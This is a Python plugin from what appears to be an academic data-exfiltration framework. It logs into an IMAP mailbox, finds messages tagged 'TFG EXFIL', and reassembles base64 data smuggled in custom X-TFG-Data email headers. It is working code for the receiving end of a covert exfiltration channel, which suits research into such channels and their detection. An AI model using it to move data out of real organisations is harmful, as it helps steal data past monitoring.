from __future__ import annotations
from typing import Dict, Any, Iterable
import imaplib, email, base64, ssl
from email.header import decode_header
from tfg.plugins.api import ExfilServerPlugin

class SmtpServerHeaders(ExfilServerPlugin):
    canal = "SMTP"
    metodo = 1
    name = "smtp_server_headers"

    @staticmethod
    def _decode_header_value(value: str) -> str:
        """Decode RFC2047-encoded header values into plain text."""
        pieces = []
        for part, enc in decode_header(value):
            if isinstance(part, bytes):
                pieces.append(part.decode(enc or "ascii", errors="replace"))
            else:
                pieces.append(part)
        return "".join(pieces)

    def run(self, config: Dict[str, Any]) -> Iterable[bytes]:
        host = config["imap_host"]
        use_ssl = bool(config.get("imap_ssl", True))
        use_starttls = bool(config.get("imap_starttls", False))
        if use_ssl and use_starttls:
            raise ValueError("imap_ssl and imap_starttls cannot both be enabled")
        default_port = 993 if use_ssl else 143
        port = int(config.get("imap_port", default_port))
        user = config["imap_user"]; password = config["imap_pass"]
        mailbox = config.get("mailbox", "INBOX")
        exfil_id = config.get("exfil_id") or "tfg"

        if use_ssl:
            imap = imaplib.IMAP4_SSL(host, port)
        else:
            imap = imaplib.IMAP4(host, port)
            if use_starttls:
                imap.starttls(ssl_context=ssl.create_default_context())
        imap.login(user, password); imap.select(mailbox)
        typ, data = imap.search(None, '(SUBJECT "TFG EXFIL ' + exfil_id + '")'); ids = data[0].split()
        if not ids:
            imap.logout()
            def empty():
                if False: yield b""
            return empty()
        mid = ids[-1]; typ, msg_data = imap.fetch(mid, "(RFC822)"); raw = msg_data[0][1]
        msg = email.message_from_bytes(raw)
        vals = msg.get_all("X-TFG-Data", [])
        decoded_vals = [self._decode_header_value(v) for v in vals]
        b64 = "".join(decoded_vals)
        decoded = base64.b64decode(b64.encode("ascii")) if b64 else b""
        imap.logout()
        def gen():
            if decoded: yield decoded
        return gen()